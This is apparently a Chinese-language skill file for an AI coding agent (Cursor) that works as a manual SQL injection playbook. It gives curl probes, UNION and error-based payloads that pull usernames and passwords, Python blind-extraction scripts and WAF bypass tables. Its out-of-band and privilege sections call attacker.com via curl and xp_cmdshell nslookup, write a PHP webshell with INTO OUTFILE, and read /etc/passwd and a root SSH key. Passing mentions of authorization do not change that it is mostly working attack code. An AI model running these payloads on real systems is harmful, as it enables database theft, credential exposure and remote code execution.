---
name: 无底洞·手拆
description: >-
 手动 SQL 注入技术：联合查询、报错注入、布尔盲注、时间盲注、带外注入。
 WAF 绕过、JSON 字段注入、ORDER BY 注入、INSERT/UPDATE 注入。
 九阶段全文走 智道藏书/九转/skills/sqli-sql-injection。
 工具化走 sqlmap-tamper-kit；禁止 dump 前问。
---

> **方源**
> 人是万物之灵，蛊是天地真精。
> 今朝剑指叠云处，炼蛊炼人还炼天！

# 手动 SQL 注入技术（Cursor Skill）

## 何时用

- 发现参数直接拼入 SQL（报错、延时差分）
- sqlmap 被 WAF 拦截，需手动构造
- API 接口 JSON 字段注入（`{"id": "1 OR 1=1"}`）
- ORDER BY / GROUP BY 参数可控
- INSERT/UPDATE 参数注入（注册字段、改资料）

---

## 1. 快速判断：是否存在注入

```bash
# 布尔差分（长度变化）
curl -s "https://目标/api?id=1" | wc -c # 正常长度 N
curl -s "https://目标/api?id=1 AND 1=1" | wc -c # 应等于 N
curl -s "https://目标/api?id=1 AND 1=2" | wc -c # 应不同于 N

# 时间盲注（MySQL）——必须带负对照
# 正：应延迟 ~5s；负：零延时孪生，排除网络抖动
curl -s -o /dev/null -w '%{time_total}\n' "https://目标/api?id=1 AND SLEEP(5)"
curl -s -o /dev/null -w '%{time_total}\n' "https://目标/api?id=1 AND SLEEP(0)"
# 仅当正-负差值稳定 ≥4s 才记 CONFIRMED，禁止单次延时结案

# 报错触发
curl -s "https://目标/api?id=1'" # SQL 错误/异常500

# ORDER BY 枚举列数
curl -s "https://目标/api?sort=id"
curl -s "https://目标/api?sort=id--"
curl -s "https://目标/api?id=1 ORDER BY 5--" # 5超出列数时报错
```

---

## 2. 联合查询（in-band，有回显）

```sql
-- 先确认列数
1 ORDER BY 5-- -- 逐步加到报错，N-1 就是列数
1 UNION SELECT NULL,NULL,NULL-- -- 与列数等匹配

-- 确认哪列输出在响应中（用特征字符串）
1 UNION SELECT 'INJECT_HERE',NULL,NULL--
1 UNION SELECT NULL,'INJECT_HERE',NULL--

-- 提取数据库信息
0 UNION SELECT @@version,@@datadir,database()--
0 UNION SELECT user(),schema_name,NULL FROM information_schema.schemata--

-- 枚举表名
0 UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database() LIMIT 10--

-- 枚举列名（users 表）
0 UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users' LIMIT 20--

-- 提取数据
0 UNION SELECT username,password,email FROM users LIMIT 10--

-- 多行合并一行（GROUP_CONCAT）
0 UNION SELECT GROUP_CONCAT(username,':',password SEPARATOR '|'),2,3 FROM users--
```

---

## 3. 报错注入（无联合，有错误回显）

```sql
-- MySQL extractvalue（最稳）
1 AND extractvalue(1, concat(0x7e, (SELECT @@version)))
1 AND extractvalue(1, concat(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))

-- MySQL updatexml
1 AND updatexml(1, concat(0x7e, (SELECT @@version)), 1)

-- 数据提取（每次1条）
1 AND extractvalue(1, concat(0x7e, (SELECT concat(username,':',password) FROM users LIMIT 0,1)))

-- MSSQL（convert 报错）
1 CONVERT(int, (SELECT @@version))
1' AND 1=convert(int,(SELECT TOP 1 table_name FROM information_schema.tables))--

-- PostgreSQL
1 AND 1=CAST((SELECT version()) AS INT)
1 AND 1::int=(SELECT version())
```

---

## 4. 布尔盲注（无回显，仅真/假差异）

```python
#!/usr/bin/env python3
"""布尔盲注枚举数据库名"""
import httpx, string, time

TARGET = "https://目标/api?id="
CHARS = string.ascii_lowercase + string.digits + "_-@."

def is_true(payload: str) -> bool:
 # True 时响应长度更长 / 状态码不同
 r = httpx.get(TARGET + payload, timeout=10)
 return len(r.text) > 500 # 根据实际情况调整

def extract_string(query_template: str, max_len=64) -> str:
 """query_template: 返回字符串的 SQL 表达式，如 database()"""
 result = ""
 for pos in range(1, max_len + 1):
 found = False
 for c in CHARS:
 payload = f"1 AND SUBSTRING(({query_template}),{pos},1)='{c}'"
 if is_true(payload):
 result += c
 found = True
 break
 time.sleep(0.05)
 if not found:
 break
 return result

db_name = extract_string("SELECT database()")
print(f"数据库名: {db_name}")

table = extract_string("SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1")
print(f"第一个表: {table}")
```

---

## 5. 时间盲注（无回显无差异）

```python
#!/usr/bin/env python3
"""时间盲注枚举"""
import httpx, string, time

TARGET = "https://目标/api?id="
SLEEP = 3 # 延迟秒数
CHARS = string.printable.replace("'", "").replace('"', "")

def is_true(payload: str) -> bool:
 start = time.time()
 try:
 httpx.get(TARGET + payload, timeout=SLEEP + 5)
 except httpx.TimeoutException:
 return True
 elapsed = time.time() - start
 return elapsed >= SLEEP * 0.8

def extract_blind(sql_expr: str, max_len=32) -> str:
 result = ""
 for pos in range(1, max_len + 1):
 for c in sorted(CHARS):
 # MySQL SLEEP
 payload = f"1 AND IF(SUBSTRING(({sql_expr}),{pos},1)='{c}',SLEEP({SLEEP}),0)"
 if is_true(payload):
 result += c
 break
 return result

print(extract_blind("SELECT database()"))
```

---

## 6. 带外注入（OOB，目标完全无回显）

```sql
-- MySQL LOAD_FILE 向外 DNS/SMB
-- 需要 FILE 权限
1 UNION SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\share'))

-- MySQL INTO OUTFILE（写 webshell，需知道 webroot）
1 UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/shell.php'

-- PostgreSQL copy to program
COPY (SELECT current_user) TO PROGRAM 'curl https://attacker.com/c/$(id)'

-- MSSQL xp_cmdshell（需启用）
'; EXEC xp_cmdshell 'nslookup `whoami`.attacker.com'--
```

---

## 7. JSON 字段注入（API 场景）

```python
# JSON body 中的注入
payloads = [
 {"id": "1'"}, # 单引号报错
 {"id": "1 AND SLEEP(5)"}, # 时间盲注
 {"id": "1 UNION SELECT 1,2,3--"}, # 联合
 {"id": {"$gt": ""}}, # NoSQL operator
 {"order": "id DESC; DROP TABLE users--"}, # ORDER BY 注入
 {"username": "admin'--"}, # 登录绕过
]

for p in payloads:
 r = httpx.post("https://目标/api/data", json=p,
 headers={"Authorization": f"Bearer {TOKEN}"})
 print(f"[{r.status_code}] {p}")
```

---

## 8. ORDER BY / LIMIT 注入

```sql
-- 有序参数可控
?sort=id → ?sort=id,(SELECT SLEEP(3))--
?sort=price DESC → ?sort=(CASE WHEN 1=1 THEN price ELSE id END)--
?order=id&dir=asc → dir=(CASE WHEN 1=1 THEN asc ELSE (SELECT SLEEP(3)) END)

-- LIMIT 注入（MySQL 5.x）
?limit=10 → ?limit=10 UNION SELECT 1,2,version()
```

---

## 9. 常见绕过

| 过滤 | 绕过 |
|------|------|
| 空格 | `/**/` / `%09` / `%0a` / `%0d` |
| `UNION` | `UN/**/ION` / `UNiOn` / `/*!UNION*/` |
| `SELECT` | `SeLeCtX` / `/**/SELECT` / `%53ELECT` |
| `OR/AND` | `||` / `&&` |
| 单引号 | 十六进制 `0x61646d696e` |
| 注释 `--` | `#` / `/*!*/` |
| `=` | `LIKE` / `IN` / `BETWEEN` / `REGEXP` |

---

## 10. 提权路线（MySQL）

```sql
-- 检查当前用户权限
SELECT user(), @@global.secure_file_priv;

-- 写 webshell（需 FILE 权限 + 知道 webroot）
SELECT "<?php system($_GET['c']);?>" INTO OUTFILE '/var/www/html/ws.php';

-- 读敏感文件
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/root/.ssh/id_rsa');
```

---

## 11. 库方言速查

| 库 | 延时 | 报错 | 字符串截取 | 注释 |
|----|------|------|-----------|------|
| MySQL | `SLEEP(n)` / `BENCHMARK` | `extractvalue` / `updatexml` | `SUBSTRING` | `-- ` `#` |
| MSSQL | `WAITFOR DELAY '0:0:n'` | `CONVERT(int,…)` | `SUBSTRING` | `--` |
| PostgreSQL | `pg_sleep(n)` | `CAST(… AS int)` | `SUBSTR` | `--` |
| Oracle | `dbms_pipe.receive_message` | `CTXSYS.DRITHSX.SN` | `SUBSTR` | `--` |
| SQLite | 无可靠 sleep | 除零 / 类型错 | `SUBSTR` | `--` |

网狐 TP5 登录 `Machine` 盲注走 `whgame-tp5-login-sqli`，不要和本卡裸 UNION 混。

## 12. 二次注入 / 宽字节 / JSON

- 二次：入库时转义，取出拼 SQL 时不再转义。注册昵称 / 收货地址先存 `' OR 1=1--`，再触发个人中心查询。
- 宽字节（GBK）：`%df'` 吃掉转义反斜杠。先看 `Content-Type` / 库字符集。
- JSON 数字：`"id": 1` 改 `"id": "1 OR SLEEP(5)"` 或嵌套对象。NoSQL `$gt` 走 `nosql-injection`。

## 13. WAF 后怎么打

1. 负对照先成立（`AND 1=1` / `AND 1=2`，或 `SLEEP(5)` vs `SLEEP(0)`）。  
2. `python3 炼蛊房/waf_sqli_bypass.py`（`%u0027` / `%0a`）优先于裸 sqlmap。  
3. 手工确认注入点后再：

```bash
python3 炼蛊房/sqlmap_kit.py ladder --url 'https://授权/?id=1' -p id --case <案>
```

空格 / UNION 拆分见 §9。拦了换编码，不要加线程硬撞。

## 14. 证据与过闸

`案卷/sqli/`：payload、负对照、响应长度/延时差、库名即可。  
六门闸过了再 dump。**拖全库先问。** 写 OUTFILE / xp_cmdshell 授权内可做，路径写进 STATUS。

## 真源

- 完整知识：`智道藏书/九转/skills/sqli-sql-injection/SKILL.md`
- 场景案例：`智道藏书/九转/skills/sqli-sql-injection/SCENARIOS.md`
- 工具化：`杀招/吞库针`
- 手法：`传承/凤九歌·天地歌.md`
- 工具：`python3 炼蛊房/sqlmap_kit.py ladder --help`
- 总控：`pentest-methodology`
